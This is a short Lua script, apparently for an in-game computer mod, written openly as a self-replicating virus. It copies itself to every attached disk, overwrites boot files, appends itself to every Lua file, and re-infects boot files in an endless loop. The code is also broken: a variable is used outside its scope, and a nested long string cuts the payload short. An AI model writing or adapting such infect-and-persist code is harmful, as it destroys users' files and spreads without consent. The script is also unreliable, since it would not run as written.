-- Virus Spreader 2025 (single-player only)
-- Spreads to every disk, every file, every boot

local component = require("component")
local computer  = require("computer")
local event     = require("event")
local gpu       = component.proxy(component.list("gpu", true)())

-- 1) Spread to every disk
for addr, _ in component.list("filesystem") do
  local virus = [[
-- Virus Spreader 2025 (single-player only)
local component = require("component")
for addr, _ in component.list("filesystem") do
  component.invoke(addr, "write", "/virus.lua", [[...]])  -- recursive
end
]]
  component.invoke(addr, "write", "/virus.lua", virus)
  component.invoke(addr, "write", "/boot.lua", virus)  -- infect boot too
end

-- 2) Spread to every file (append virus to each .lua)
for addr, _ in component.list("filesystem") do
  for name in component.invoke(addr, "list", "/") do
    if name:match("%.lua$") then
      local original = component.invoke(addr, "read", "/" .. name) or ""
      local infected = original .. "\n-- infected by Virus 2025\n" .. virus
      component.invoke(addr, "write", "/" .. name, infected)
    end
  end
end

-- 3) Spread to every boot (infinite loop)
while true do
  for addr, _ in component.list("filesystem") do
    component.invoke(addr, "write", "/boot.lua", virus)
  end
  computer.pull(1)  -- spread every second
end
